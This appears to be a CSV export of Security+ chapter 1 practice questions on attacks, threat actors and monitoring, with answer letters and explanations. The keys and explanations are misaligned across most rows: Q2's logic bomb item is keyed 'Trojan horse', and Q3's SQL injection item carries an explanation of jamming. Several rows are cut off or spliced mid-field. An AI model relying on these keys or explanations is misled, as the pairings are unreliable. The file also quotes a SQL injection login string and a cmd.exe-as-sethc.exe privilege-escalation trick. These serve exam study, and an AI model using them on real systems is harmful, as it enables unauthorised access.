Objective-1,1,CH1_SEIDL,"Ahmed is a sales manager with a major insurance company. He has received an email that is encouraging him to click on a link and fill out a survey. He is suspicious of the email, but it does mention a major insurance association, and that makes him think it might be legitimate.  Which of the following best describes this attack?",, A. Phishing, B. Social engineering, C. Spear phishing, D. Trojan horse,C,"The correct answer is spear phishing. Spear phishing is targeted to a specific group, in this case insurance professionals. Although this is a form of phishing, the more specific answer is the one you will need to choose on questions like this. Phishing uses social engineering techniques to succeed but is once again a broader answer than spear phishing and thus is not the correct choice. Finally, a Trojan horse pretends to be a legitimate or desirable program or file, which this scenario doesn’t describe.  B. A logic bomb is malware that performs its malicious activity when some condition is met.  A worm is malware that self-propagates. A Trojan horse is malware attached to a legitimate program, and a rootkit is malware that gets root or administrative privileges."
Objective-1,2,CH1_SEIDL,You are a security administrator for a medium-sized bank. You have discovered a piece of software on your bankâ€™s database server that is not supposed to be there. It appears that the software will begin deleting database files if a specific employee is terminated. What best describes this?,, A. Worm, B. Logic bomb, C. Trojan horse, D. Rootkit,C,"This is a very basic form of SQL injection. Cross-site scripting would have JavaScript in the text field and would be designed to impact other sites from a user’s session. Cross-site request forgery would not involve any text being entered in the web page, and ARP poisoning is altering the ARP table in a switch; it is not related to website hacking."
Objective-1,3,CH1_SEIDL,"You are responsible for incident response at Acme Bank. The Acme Bank website has been attacked. The attacker used the login screen, but rather than enter login credentials, they entered some odd text: ' or '1' = '1. What is the best description for this attack?",, A. Cross-site scripting, B. Cross-site request forgery, C. SQL injection, D. ARP poisoning,B,"This describes a jamming attack, where legitimate traffic is interfered with by another signal. Jamming can be intentional or unintentional and may be intermittent. IV attacks are obscure cryptographic attacks on stream ciphers. Wi-Fi protected setup (WPS) uses a PIN to connect to the wireless access point (WAP). The WPS attack attempts to intercept that PIN in transmission, connect to the WAP, and then steal the WPA2 password. A botnet is a group of machines that are being used, without their consent, as part of an attack."
Objective-1,4,CH1_SEIDL,Users are complaining that they cannot connect to the wireless network. You discover that the WAPs are being subjected to a wireless attack designed to block their Wi-Fi signals.  Which of the following is the best label for this attack?,, A. IV attack, B. Jamming, C. WPS attack, D. Botnet,B,"The best option listed to defend against the attacks mentioned is input validation.  Encrypting the web traffic will not have any effect on these two attacks. A web application firewall (WAF) might mitigate these attacks, but it would be secondary to input validation, and an intrusion detection system (IDS) will simply detect the attack—it won’t stop it."
Objective-1,5,CH1_SEIDL,Frank is deeply concerned about attacks to his companyâ€™s e-commerce server. He is particularly worried about cross-site scripting and SQL injection. Which of the following would best defend against these two specific attacks?,, A. Encrypted web traffic, B. Input validation, C. A firewall, D. An IDS,C,"If users have been connecting but the AP does not show them connecting, then they have been connecting to a rogue access point. This could be the cause of an architecture and design weakness such as a network without segmentation and control of devices connecting to the network. Session hijacking involves taking over an already authenticated session. Most session hijacking attacks involve impersonation. The attacker attempts to gain access to another user’s session by posing as that user. Clickjacking involves causing visitors to a website to click on the wrong item. Finally, bluejacking is a Bluetooth attack."
Objective-1,6,CH1_SEIDL,"You are responsible for network security at Acme Company. Users have been reporting that personal data is being stolen when using the wireless network. They all insist they only connect to the corporate wireless access point (AP). However, logs for the AP show that these users have not connected to it. Which of the following could best explain this situation?",, A. Session hijacking, B. Clickjacking, C. Rogue access point, D. Bluejacking,C,"Cross-site scripting involves entering a script into text areas that other users will view.  SQL injection is not about entering scripts, but rather SQL commands. Clickjacking is about tricking users into clicking on the wrong thing. Bluejacking is a Bluetooth attack."
Objective-1,7,CH1_SEIDL,What type of attack depends on the attacker entering JavaScript into a text area that is intended for users to enter text that will be viewed by other users?,, A. SQL injection, B. Clickjacking, C. Cross-site scripting, D. Bluejacking,D,"Retaining the actual password is not a best practice, and thus encrypting password plain text is not a common technique to make passwords harder to crack. Since the application would need the cryptographic key to read the passwords, anybody who had access to that key could decrypt the passwords. Using a salt, a pepper, and a cryptographic hashing algorithm designed for passwords are all common best practices to prevent offline bruteforce attacks.  A. Although this is one of the more dated items on the Security+ exam outline, you need to know that the term for Internet messaging spam messages is SPIM. The rest of the answers were made up, and though this shows up in the exam outline, the rest of the world has moved on from using this term."
Objective-1,8,CH1_SEIDL,Rick wants to make offline brute-force attacks against his password file very difficult for attackers. Which of the following is not a common technique to make passwords harder to crack?,, A. Use of a salt, B. Use of a pepper, C. Use of a purpose-built password hashing algorithm, D. Encrypting password plain text using symmetric encryption,B,"A segmentation fault will typically stop the program from running. This type of issue is why a NULL pointer or other pointer de-referencing error is considered a potential security issue, as a denial-of-service condition impacts the availability of the service. This type of error is unlikely to cause a data breach or allow privilege escalation, and permissions creep occurs as individuals accrue more permissions over time in a single organization as their permissions are not cleaned up when they switch positions or roles."
Objective-1,9,CH1_SEIDL,What term is used to describe spam over Internet messaging services?,, A. SPIM, B. SMSPAM, C. IMSPAM, D. TwoFaceTiming,C,"The machines in her network are being used as bots, and the users are not aware that they are part of a distributed denial-of-service (DDoS) attack. Social engineering is when someone tries to manipulate you into giving information. Techniques involved in social engineering attacks include consensus, scarcity, and familiarity. There is a slight chance that all computers could have a backdoor, but that is very unlikely, and attackers normally don’t manually log into each machine to do a DDoS—it would be automated, as through a bot."
Objective-1,10,CH1_SEIDL,Susan is analyzing the source code for an application and discovers a pointer de-reference and returns NULL. This causes the program to attempt to read from the NULL pointer and results in a segmentation fault. What impact could this have for the application?,, A. A data breach, B. A denial-of-service condition, C. Permissions creep, D. Privilege escalation,C,"There are many indicators of compromise (IoCs), including unusual outbound network traffic, geographical irregularities like logins from a country where the person normally does not work, or increases in database read volumes beyond normal traffic patterns. Predictive analysis is analysis work done using datasets to attempt to determine trends and likely attack vectors so that analysts can focus their efforts where they will be most needed and effective.  OSINT is open source intelligence, and threat maps are often real-time or near real-time visualizations of where threats are coming from and where they are headed to.  Use the following scenario for questions 13–15. Chris has recently deployed a security information and event management (SIEM) device and wants to use it effectively in his organization. He knows that SIEM systems have a broad range of capabilities and wants to use the features to solve problems that he knows his organization faces. In each of the following questions, identify the most appropriate SIEM capability or technique to accomplish what Chris needs to do for his organization."
Objective-1,11,CH1_SEIDL,"Teresa is the security manager for a mid-sized insurance company. She receives a call from law enforcement, telling her that some computers on her network participated in a massive denial-of-service (DoS) attack. Teresa is certain that none of the employees at her company would be involved in a cybercrime. What would best explain this scenario?",, A. It is a result of social engineering., B. The machines all have backdoors., C. The machines are bots., D. The machines are infected with crypto-viruses.,B,"When troubleshooting TCP handshakes, the most valuable tool in many cases is packet capture. If Chris sees a series of SYN packets without the handshake being completed, he can be reasonably sure the firewall is blocking traffic. Reviewing reports or logs may be useful for this as well but won’t show the TCP handshake issue mentioned in the problem, and sentiment analysis is focused on how individuals and groups are responding, not on a technical problem."
Objective-1,12,CH1_SEIDL,"Unusual outbound network traffic, geographical irregularities, and increases in database read volumes are all examples of what key element of threat intelligence?",, A. Predictive analysis, B. OSINT, C. Indicators of compromise, D. Threat maps,D,"User behavior analysis is a key capability when attempting to detect potential insider threats. Chris can use his SIEM’s behavioral analysis capabilities to detect improper or illicit use of rights and privileges as well as abnormal behavior on the part of his users. Sentiment analysis helps analyze feelings, and log aggregation and security monitoring provide ways to gain insight into the overall security posture and status of the organization."
Objective-1,13,CH1_SEIDL,Chris needs visibility into connection attempts through a firewall because he believes that a TCP handshake is not properly occurring. What security information and event management (SIEM) capability is best suited to troubleshooting this issue?,, A. Reviewing reports, B. Packet capture, C. Sentiment analysis, D. Log collection and analysis,A,"Using log aggregation to pull together logs from multiple sources, and performing collection and initial analysis on log collectors can help centralize and handle large log volumes. Capturing packets is useful for network traffic analysis to identify issues or security concerns. Security monitoring is an overall function for security information and event management (SIEM) and doesn’t specifically help with this need. Both sentiment analysis and user behavior analysis are aimed at users and groups rather than at how data is collected and managed."
Objective-1,14,CH1_SEIDL,Chris wants to detect a potential insider threat using his security information and event management (SIEM) system. What capability best matches his needs?,, A. Sentiment analysis, B. Log aggregation, C. Security monitoring, D. User behavior analysis,B,"White teams act as judges and observers during cybersecurity exercises. Blue teams act as defenders, red teams act as attackers, and purple teams are composed of both blue and red team members to combine attack and defense knowledge to improve organizational security."
Objective-1,15,CH1_SEIDL,Chris has hundreds of systems spread across multiple locations and wants to better handle the amount of data that they create. What two technologies can help with this?,, A. Log aggregation and log collectors, B. Packet capture and log aggregation, C. Security monitoring and log collectors, D. Sentiment analysis and user behavior analysis,A,The simplest way to ensure that APIs are only used by legitimate users is to require the use of authentication. API keys are one of the most frequently used methods for this. If an
Objective-1,16,CH1_SEIDL,What type of security team establishes the rules of engagement for a cybersecurity exercise?,, A. Blue team, B. White team, C. Purple team, D. Red team,A," key is lost or stolen, the key can be invalidated and reissued, and since API keys can be matched to usage, Cynthia’s company can also bill customers based on their usage patterns if they want to. A firewall or IP restrictions may be able to help, but they can be fragile; customer IP addresses may change. An intrusion prevention system (IPS) can detect and prevent attacks, but legitimate usage would be hard to tell from those who are not customers using an IPS."
Objective-1,17,CH1_SEIDL,Cynthia is concerned about attacks against an application programming interface (API) that her company provides for its customers. What should she recommend to ensure that the API is only used by customers who have paid for the service?,, A. Require authentication., B. Install and configure a firewall., C. Filter by IP address., D. Install and use an IPS.,B,"Buffer overflow attacks cram more data into a field or buffer than they can accept, overflowing into other memory locations and either crashing the system or application, or potentially allowing code to be inserted into executable locations. Bluesnarfing and bluejacking are both Bluetooth attacks. Cross-site scripting attacks allow attackers to inject scripts into pages viewed by other users."
Objective-1,18,CH1_SEIDL,What type of attack is based on sending more data to a target variable than the data can actually hold?,, A. Bluesnarfing, B. Buffer overflow, C. Bluejacking, D. Cross-site scripting,A,"Attackers are attempting to influence Gurvinder with a combination of scarcity and urgency. Thus, for this question you should answer scarcity since urgency is not listed. In many social engineering principle questions, more than one of the principles may be in play, and you will need to answer with the principle that is correct or more correct for the question. In this case, there is no intimidation or claim to authority, and consensus would require some form of validation from others."
Objective-1,19,CH1_SEIDL,An email arrives telling Gurvinder that there is a limited time to act to get a software package for free and that the first 50 downloads will not have to be paid for. What social engineering principle is being used against him?,, A. Scarcity, B. Intimidation, C. Authority, D. Consensus,A,"Vulnerability scans use automated tools to look for known vulnerabilities in systems and applications and then provide reports to assist in remediation activities. Penetration tests seek to actually exploit the vulnerabilities and break into systems. Security audits usually focus on checking policies, incident reports, and other documents. Security test is a generic term for any sort of test."
Objective-1,20,CH1_SEIDL,You have been asked to test your company network for security issues. The specific test you are conducting involves primarily using automated and semiautomated tools to look for known vulnerabilities with the various systems on your network. Which of the following best describes this type of test?,, A. Vulnerability scan, B. Penetration test, C. Security audit, D. Security test,C,"Username complexity has no impact in credential harvesting. Multifactor authentication can help prevent successful credential harvesting by ensuring that even capture of username and password is not enough to compromise the account. Awareness training helps to reduce the likelihood of credential exposure, and limiting or preventing use of third-party web scripts makes websites less likely to have credentials stolen through the use of those scripts, plug-ins, or modules."
Objective-1,21,CH1_SEIDL,Susan wants to reduce the likelihood of successful credential harvesting attacks via her organizationâ€™s commercial websites. Which of the following is not a common prevention method aimed at stopping credential harvesting?,, A. Use of multifactor authentication, B. User awareness training, C. Use of complex usernames, D. Limiting or preventing use of third-party web scripts and plugins,C,Greg can clone a legitimate Media Access Control (MAC) address if he can identify one on the network. This can be as easy as checking for a MAC label on some devices or by capturing traffic on the network if he can physically access it.
Objective-1,22,CH1_SEIDL,Greg wants to gain admission to a network which is protected by a network access control (NAC) system that recognized the hardware address of systems. How can he bypass this protection?,, A. Spoof a legitimate IP address., B. Conduct a denial-of-service attack against the NAC system., C. Use MAC cloning to clone a legitimate MAC address., D. None of the above,A,"From the description it appears that they are not connecting to the real web server but rather a fake server. That indicates typo squatting: have a URL that is named very similarly to a real site so that when users mistype the real site’s URL they will go to the fake site.  Options B, C, and D are all incorrect. These are all methods of attacking a website, but in this case, the actual website was not attacked. Instead, some users are visiting a fake site."
Objective-1,23,CH1_SEIDL,"Coleen is the web security administrator for an online auction website. A small number of users are complaining that when they visit the website it does not appear to be the correct site. Coleen checks and she can visit the site without any problem, even from computers outside the network. She also checks the web server log and there is no record of those users ever connecting. Which of the following might best explain this?",, A. Typo squatting, B. SQL injection, C. Cross-site scripting, D. Cross-site request forgery,C,"Domain hijacking, or domain theft, occurs when the registration or other information for the domain is changed without the original registrant’s permission. This may occur because of a compromised account or due to a breach of the domain registrar’s security. A common issue is a lapsed domain being purchased by a third party, and this can look like a hijacked domain, but it is a legitimate occurrence if the domain is not renewed! DNS hijacking inserts false information into a DNS server, on-path (man-in-the-middle) attacks capture or modify traffic by causing the traffic to pass through a compromised midpoint, and zero-day attacks are attacks that use an unknown until used vulnerability."
Objective-1,24,CH1_SEIDL,"The organization that Mike works in finds that one of their domains is directing traffic to a competitorâ€™s website. When Mike checks, the domain information has been changed, including the contact and other administrative details for the domain. If the domain had not expired, what has most likely occurred?",, A. DNS hijacking, B. An on-path attack, C. Domain hijacking, D. A zero-day attack,D,"The term for low-skilled hackers is script kiddie. Script kiddies typically use prebuilt tools and do not have the expertise to make or modify their own tools. Nothing indicates this is being done for ideological reasons, and thus that a hacktivist is involved. Although “Amateur” may be an appropriate description, the correct term is script kiddie. Finally, nothing in this scenario indicates an insider threat."
Objective-1,25,CH1_SEIDL,"Mahmoud is responsible for managing security at a large university. He has just performed a threat analysis for the network, and based on past incidents and studies of similar networks, he has determined that the most prevalent threat to his network is low-skilled attackers who wish to breach the system, simply to prove they can or for some low-level crime, such as changing a grade. Which term best describes this type of attacker?",, A. Hacktivist, B. Amateur, C. Insider, D. Script kiddie,B,"Phishing is intended to acquire data, most often credentials or other information that will be useful to the attacker. Spam is a broader term for unwanted email, although the term is often generally used to describe unwanted communications. Spear phishing targets specific individuals, whereas whaling targets important people in an organization. Smishing is sent via SMS (text message). Malware can be sent in any of these instances, but there is not a specific related term that means “spam with malware in it.”"
Objective-1,26,CH1_SEIDL,How is phishing different from general spam?,, A. It is sent only to specific targeted individuals., B. It is intended to acquire credentials or other data., C. It is sent via SMS., D. It includes malware in the message.,B,"A collection of computers that are compromised, then centrally controlled to perform actions like denial-of-service attacks, data collection, and other malicious activities is called a botnet.

Nullnet, D. Attacknet,B,"Systems and software that no longer have vendor support can be a significant security risk, and ensuring that a vendor will continue to exist and provide support is an important part of many procurement processes. Selah’s questions are intended to assess the longevity and viability of the company and whether buying from them will result in her organization having a usable product for the long term."
Objective-1,28,CH1_SEIDL,Selah includes a question in her procurement request-for-proposal process that asks how long the vendor has been in business and how many existing clients the vendor has. What common issue is this practice intended to help prevent?,, A. Supply chain security issues, B. Lack of vendor support, C. Outsourced code development issues, D. System integration problems,B,"Passive reconnaissance is any reconnaissance that is done without actually connecting to the target. In this case, John is conducting a form of OSINT, or open source intelligence, by using commonly available third-party information sources to gather information about his target. Active reconnaissance involves communicating with the target network, such as doing a port scan. The initial exploitation is not information gathering; it is actually breaking into the target network. A pivot is when you have breached one system and use that to move to another system."
Objective-1,29,CH1_SEIDL,"John is conducting a penetration test of a clientâ€™s network. He is currently gathering information from sources such as archive.org, netcraft.com, social media, and information websites. What best describes this stage?",, A. Active reconnaissance, B. Passive reconnaissance, C. Initial exploitation, D. Pivot,A,"Server-side request forgery (SSRF) attempts typically attempt to get HTTP data passed through and will not include SQL injection.

Blocking hostnames like 127.0.01 and localhost, C. Blocking sensitive URLs like /admin, D. Applying whitelist-based input filters,A,"Domain Name System (DNS) poisoning attacks attempt to insert incorrect or malicious entries into a trusted DNS server. Address Resolution Protocol (ARP) poisoning involves altering the MAC-IP tables in a switch. Although cross-site scripting (XSS) and cross-site request forgery (CSRF or XSRF) are both types of attacks, neither is a poisoning attack."
Objective-1,31,CH1_SEIDL,What type of attack is based on entering fake entries into a target networkâ€™s domain name server?,, A. DNS poisoning, B. ARP poisoning, C. XSS poisoning, D. CSRF poisoning,C,"An unknown environment test is also called black-box or a zero-knowledge test because it does not provide information beyond the basic information needed to identify the target. A known environment, or white-box test, involves very complete information being given to the tester. This scenario is probably done from outside the network, but external test is not the correct terminology. Threat test is not a term used in penetration testing."
Objective-1,32,CH1_SEIDL,"Frank has been asked to conduct a penetration test of a small bookkeeping firm. For the test, he has only been given the company name, the domain name for their website, and the IP address of their gateway router. What best describes this type of test?",, A. A known environment test, B. External test, C. An unknown environment test, D. Threat test,D,"A pivot occurs when you exploit one machine and use that as a basis to attack other systems.

Objective-1,33,CH1_SEIDL,"You work for a security company that performs penetration testing for clients. You are conducting a test of an e-commerce company. You discover that after compromising the web server, you can use the web server to launch a second attack into the companyâ€™s internal network. What best describes this?",, A. Internal attack, B. Known environment testing, C. Unknown environment testing, D. A pivot,A,"Shimming is when the attacker places some malware between an application and some other file and intercepts the communication to that file (usually to a library or system API).  In many cases, this is done with a driver for a hardware component. A Trojan horse might be used to get the shim onto the system, but that is not described in this scenario. A backdoor is a means to circumvent system authorization and get direct access to the system. Refactoring is the process of changing names of variables, functions, and so forth in a program."
Objective-1,34,CH1_SEIDL,"While investigating a malware outbreak on your company network, you discover something very odd. There is a file that has the same name as a Windows system DLL, and it even has the same API interface, but it handles input very differently, in a manner to help compromise the system, and it appears that applications have been attaching to this file, rather than the real system DLL. What best describes this?",, A. Shimming, B. Trojan horse, C. Backdoor, D. Refactoring,C,"SOAR is a relatively new category as defined by Gartner. Security orchestration, automation, and response includes threat and vulnerability management, security incident response, and security operations automation, but not automated malware analysis."

Objective-1,36,CH1_SEIDL,John discovers that email from his companyâ€™s email servers is being blocked because of spam that was sent from a compromised account. What type of lookup can he use to determine what vendors like McAfee and Barracuda have classified his domain as?,, A. An nslookup, B. A tcpdump, C. A domain reputation lookup, D. A SMTP whois,B,"His machines are part of a distributed denial-of-service (DDoS) attack. This scenario describes a generic DDoS, not a specific one like SYN flood, which would involve many SYN packets being sent without a full three-way TCP handshake. These machines could be part of a botnet or they may just have a trigger that causes them to launch the attack at a specific time. The real key in this scenario is the DDoS attack. Finally, a backdoor gives an attacker access to the target system."
Objective-1,37,CH1_SEIDL,Frank is a network administrator for a small college. He discovers that several machines on his network are infected with malware. That malware is sending a flood of packets to a target external to the network. What best describes this attack?,, A. SYN flood, B. DDoS, C. Botnet, D. Backdoor,B,"Since open Wi-Fi hotspots do not have a way to prove they are legitimate, they can be easily spoofed. Attackers can stand up a fake version of the hotspot and then conduct an SSL stripping attack by inserting themselves into sessions that victims attempt to open to secure servers."
Objective-1,38,CH1_SEIDL,Why is SSL stripping a particular danger with open Wi-Fi networks?,, A. WPA2 is not secure enough to prevent this., B. Open hotspots do not assert their identity in a secure way., C. Open hotspots can be accessed by any user., D. 802.11ac is insecure and traffic can be redirected.,B,"A Trojan horse attaches a malicious program to a legitimate program.

Macro virus,D,"Whaling is targeting a specific individual who is important in the organization like the president or chief financial officer (CFO). Spear phishing targets specific individuals or groups, but whaling is more specific in terms of the importance of the individuals involved.  Targeted phishing is not a term used in the industry. Phishing is the generic term for a wide range of related attacks, and you should choose the most accurate answer for questions like this."
Objective-1,40,CH1_SEIDL,"When phishing attacks are so focused that they target a specific high-ranking or important individual, they are called what?",, A. Spear phishing, B. Targeted phishing, C. Phishing, D. Whaling,D,"Criminal syndicates may produce, sell, and support malware tools, or may deploy them themselves. Crypto malware and other packages are examples of tools often created and used by criminal syndicates. State actors are more likely to be associated with advanced persistent threats (APTs) aimed at accomplishing goals of the nation-state that supports them. Hacktivists typically have political motivations, whereas script kiddies may simply be in it for recognition or fun."
Objective-1,41,CH1_SEIDL,What type of threat actors are most likely to have a profit motive for their malicious activities?,, A. State actors, B. Script kiddies, C. Hacktivists, D. Criminal syndicates,A,"A rainbow table is a table of precomputed hashes, used to retrieve passwords. A backdoor is used to gain access to a system, not to recover passwords. Social engineering and dictionary attacks can both be used to gain access to passwords, but they are not tables of precomputed hashes."
Objective-1,42,CH1_SEIDL,"One of your users cannot recall the password for their laptop. You want to recover that password for them. You intend to use a tool/technique that is popular with hackers, and it consists of searching tables of precomputed hashes to recover the password. What best describes this?",, A. Rainbow table, B. Backdoor, C. Social engineering, D. Dictionary attack,B,"The most common concern that will arise when a vendor no longer supports a device is a lack of updates or patches. This is particularly concerning when the devices are operational technology such as utility, lighting, or other infrastructure control devices that have a very long life cycle and control important processes or systems. Although improper data storage, lack of documentation, and configuration issues can all be issues, lack of updates and patching remains the biggest and most frequent issue."

What describes this attack?",, A. Bluejacking, B. Bluesnarfing, C. Evil twin, D. Rogue access point,A,"Since Dennis is able to view the web traffic before it is sent to the actual server, he should be able to conduct a plain-text password attack by intercepting the password. Pass-the-hash attacks are typically used inside Windows environments, SQL injection would attack the server, and cross-site scripting is possible but not as likely as the plain-text password attack in this scenario."
Objective-1,45,CH1_SEIDL,Dennis uses an on-path attack to cause a system to send HTTPS traffic to his system and then forwards it to the actual server the traffic is intended for. What type of password attack can he conduct with the data he gathers if he captures all the traffic from a login form?,, A. A plain-text password attack, B. A pass-the-hash attack, C. A SQL injection attack, D. A cross-site scripting attack,A,"Dumpster diving is the term for rummaging through the waste/trash to recover useful documents or materials. Penetration testers and attackers may dumpster-dive as part of their efforts. In fact, emptying trash cans in a location can provide useful information even without jumping into a dumpster! Trash diving and trash engineering are not the terms used in the industry. Nothing in this scenario describes social engineering."

Rick’s best option from the list provided is to enable PowerShell logging and then to review the logs on systems he believes are infected. Since fileless viruses don’t use files, an image of the disk is unlikely to provide much useful data. Disabling the administrative user won’t have an impact, since the compromise will happen inside the account of whichever user is logged in and impacted by the malware. Crash dump files could have artifacts of the fileless virus if the machine crashed while it was active, but unless that occurs they will not have that information."

Organized crime,B,"A SYN flood is a type of resource exhaustion attack and uses up all available sessions on the system it is aimed at. Although a SYN flood can be a DDoS, no mention was made of multiple source machines for the attack. No application was mentioned, and a SYN flood targets the TCP/IP stack on the system rather than an application. No vulnerability was mentioned, and none is required for a SYN flood, since it simply tries to overwhelm the target’s ability to handle the opened connections. Protections against SYN floods tend to focus on preventing opened connections from causing resource exhaustion and identifying and blocking abusive hosts."
Objective-1,166,CH1_SEIDL,A SYN flood seeks to overwhelm a system by tying up all the open sessions that it can create.  What type of attack is this?,, A. A DDoS, B. A resource exhaustion attack, C. An application exploit, D. A vulnerability exploit,A,"Pretexting is a type of social engineering that involves using a false motive and lying to obtain information. Here, the penetration tester lied about their role and why they are calling (impersonation), and then built some trust with the user before asking for personal information. A watering hole attack leverages a website that the targeted users all use and places malware on it to achieve their purpose. Prepending is described by CompTIA as “adding an expression or a phrase,” and shoulder surfing involves looking over an individual’s shoulder or otherwise observing them entering sensitive information like passwords."
Objective-1,167,CH1_SEIDL,"A penetration tester calls a staff member for her target organization and introduces herself as a member of the IT support team.

Low ports should not be open to the Internet., B. Telnet is an insecure protocol., C. SSH is an insecure protocol., D. Ports 1-1024 are well-known ports and must be firewalled.,B,"Privilege escalation attacks focus on gaining additional privileges. In this case, Cameron used physical access to the system to modify it, allowing him to then conduct a privilege escalation attack as an unprivileged user. A Trojan would have required a file to act like it was desirable, a denial-of-service attack would have prevented access to a system or service, and swapfiles (or pagefiles) are drive space used to contain the contents of memory when memory runs low. Swapfiles may contain sensitive data, but the term swapfile attack is not commonly used."
Objective-1,172,CH1_SEIDL,"During a penetration test, Cameron gains physical access to a Windows system and uses a system repair disk to copy cmd.exe to the %systemroot%\system32 directory while renaming it sethc.exe.

Providing full details of the environment to the participants, C. Providing partial details of the environment to the participants, D. Providing defense against the attackers in the exercise,C,"Bug bounties are increasingly common and can be quite lucrative. Bug bounty websites match vulnerability researchers with organizations that are willing to pay for information about issues with their software or services. Ransoms are sometimes demanded by attackers, but this is not a ransom since it was voluntarily paid as part of a reward system. A zeroday disclosure happens when a vulnerability is disclosed and the organization has not been previously informed and allowed to fix the issue. Finally, you might feel like $10,000 is a payday, but the term is not used as a technical term and doesn’t appear on the exam."
Objective-1,176,CH1_SEIDL,"Susan receives $10,000 for reporting a vulnerability to a vendor who participates in a program to identify issues. What term is commonly used to describe this type of payment?",, A. A ransom, B. A payday, C. A bug bounty, D. A zero-day disclosure,A,"Linux privileges can be set numerically, and 777 sets user, group, and world to all have read, write, and execute access to the entire /etc directory. Setting permissions like this is a common workaround when permissions aren’t working but can expose data or make binaries executable by users who should not have access to them. When you set permissions for a system, remember to set them according to the rule of least privilege: only the permissions that are required for the role or task should be configured."
Objective-1,177,CH1_SEIDL,"Charles sets the permissions on the /etc directory on a Linux system to 777 using the chmod command. If Alex later discovers this, what should he report his finding as?",, A. Open or weak permissions, B. Improper file handling, C. A privilege escalation attack, D.

When wireless networks became the norm, the same type of language was used, leading to terms like war walking, war driving, and even war flying. The rest of the options were made up, but you should remember that the Security+ exam expects you to know about war driving and war flying."
Objective-1,179,CH1_SEIDL,What term is used to describe mapping wireless networks while driving?,, A. Wi-driving, B. Traffic testing, C. War driving, D. CARINT,B,"Lighting and utility systems, as well as SCADA, PLCs, CNC, scientific equipment and similar devices are types of operational technology. Since this is a distributed attack that results in a denial of service, it is a distributed denial-of-service (DDoS) attack. OT systems are often isolated or otherwise protected from remote network connections to prevent this type of attack since many OT devices do not have strong security controls or frequent updates. A SCADA overflow is not a term used in the industry, but network and application DDoS attacks do appear on the Security+ exam outline, and you will need to be able to differentiate them from this type of OT DDoS."

A SCADA overflow, B. An operational technology (OT) DDoS, C. A network DDoS, D. An application DDoS,C,"A false negative occurs with a vulnerability scanning system when a scan is run and an issue that exists is not identified. This can be because of a configuration option, a firewall, or other security setting or because the vulnerability scanner is otherwise unable to detect the issue. A missing vulnerability update might be a concern if the problem did not specifically state that the definitions are fully up-to-date. Unless the vulnerability is so new that there is no definition, a missing update shouldn’t be the issue. Silent patching refers to a patching technique that does not show messages to users that a patch is occurring. A false positive would have caused a vulnerability to show that was not actually there. This sometimes happens when a patch or fix is installed but the application does not change in a way that shows the change."
Objective-1,181,CH1_SEIDL,Ben runs a vulnerability scan using up-to-date definitions for a system that he knows has a vulnerability in the version of Apache that it is running. The vulnerability scan does not show that issue when he reviews the report. What has Ben encountered?,, A. A silent patch, B. A missing vulnerability update, C. A false negative, D. A false positive,A,"Refactoring a program by automated means can include adding additional text, comments, or nonfunctional operations to make the program have a different signature without changings its operations. This is typically not a manual operation due to the fact that antimalware tools can quickly find new versions. Instead, refactoring is done via a polymorphic or code mutation technique that changes the malware every time it is installed to help avoid signature-based systems."

Impersonation, B. Whaling, C. A watering hole attack, D. Prepending,D,"Acquisition via the gray market can lead to lack of vendor support, lack of warranty coverage, and the inability to validate where the devices came from. Nick should express concerns about the supply chain, and if his devices need to be from a trusted source or supplier with real support he may need to change his organization’s acquisition practices."
Objective-1,191,CH1_SEIDL,Nick purchases his network devices through a gray market supplier that imports them into his region without an official relationship with the network device manufacturer. What risk should Nick identify when he assesses his supply chain risk?,, A. Lack of vendor support, B. Lack of warranty coverage, C. Inability to validate the source of the devices, D. All of the above,B,"XML injection is often done by modifying HTTP queries sent to an XML-based web service. Reviewing web server logs to see what was sent and analyzing them for potential attacks will help Christina see if unexpected user input is visible in the logs. Syslog, authentication logs, and event logs are unlikely to contain information about web applications that would show evidence of an XML injection–based attack.  Use the following scenario for questions 193–195.  Frank is the primary IT staff member for a small company and has migrated his company’s infrastructure from an on-site datacenter to a cloud-based infrastructure as a service (IaaS) provider. Recently he has been receiving reports that his website is slow to respond and that it is inaccessible at times. Frank believes that attackers may be conducting a denial-ofservice attack against his organization."
Objective-1,192,CH1_SEIDL,Christina wants to identify indicators of attack for XML-based web applications that her organization runs. Where is she most likely to find information that can help her determine whether XML injection is occurring against her web applications?,, A. Syslog, B. Web server logs, C. Authentication logs, D. Event logs,C,"Frank’s best option is to review the anti-denial-of-service and other security tools that his cloud hosting provider provides, and to make appropriate use of them. The major infrastructure as a service (IaaS) providers have a variety of security tools that can help both detect and prevent DoS attacks from taking down sites that are hosted in their infrastructure. Calling the cloud service provider’s ISP will not work because the ISP works with the cloud provider, not with Frank! It is possible the cloud service provider might be able to assist Frank, but they are most likely to instruct him to use the existing tools that they already provide."
Objective-1,193,CH1_SEIDL,What can Frank do to determine if he is suffering from a denial-of-service (DoS) attack against his cloud hosting environment?,, A. Nothing; cloud services do not provide security tools., B. Call the cloud service provider to have them stop the DoS attack., C. Review the cloud service provider’s security tools and enable logging and anti-DoS, tools if they exist.,C,"Since Frank is using the cloud service provider’s web services, he will need to review the logs that they capture. If he has not configured them, he will need to do so, and he will then need a service or capability to analyze them for the types of traffic he is concerned about.  Syslog and Apache logs are both found on a traditional web host, and they would be appropriate if Frank was running his own web servers in the infrastructure as a service (IaaS) environment."
Objective-1,194,CH1_SEIDL,Frank is using the cloud hosting serviceâ€™s web publishing service rather than running his own web servers. Where will Frank need to look to review his logs to see what types of traffic his application is creating?,, A. Syslog, B. Apache logs, C. The cloud service’s web logs, D. None of the above,B,"The most useful data is likely to come from an IPS, or intrusion prevention system. He will be able to determine if the attack is a denial-of-service (DoS) attack, and the IPS may be able to help him determine the source of the denial-of-service attack. A firewall might provide some useful information but would only show whether or not traffic was allowed and would not analyze the traffic for attack information. A vulnerability scanner would indicate if there was an issue with his application or the server, but it would not identify this type of attack. Antimalware software can help find malware on the system but isn’t effective against a DoS attack."
Objective-1,195,CH1_SEIDL,"If Frank were still operating in his on-site infrastructure, which of the following technologies would provide the most insight into what type of attack he was seeing?",, A. A firewall, B. An IPS, C. A vulnerability scanner, D. Antimalware software,D,"Contractual terms, auditing, and security reviews are all common means of reducing third-party risks when working with a vendor that is performing systems integration work."
Objective-1,196,CH1_SEIDL,Alaina wants to ensure that the on-site system integration that a vendor that her company is working with is done in accordance with industry best practices. Which of the following is not a common method of ensuring this?,, A. Inserting security requirements into contracts,   B. Auditing configurations,   C. Coordinating with the vendor for security reviews during and after installation, D. Req,A,SOC (service organization controls) report would typically be requested if you were going to use a third-party vendor’s datacenter or hosted services.
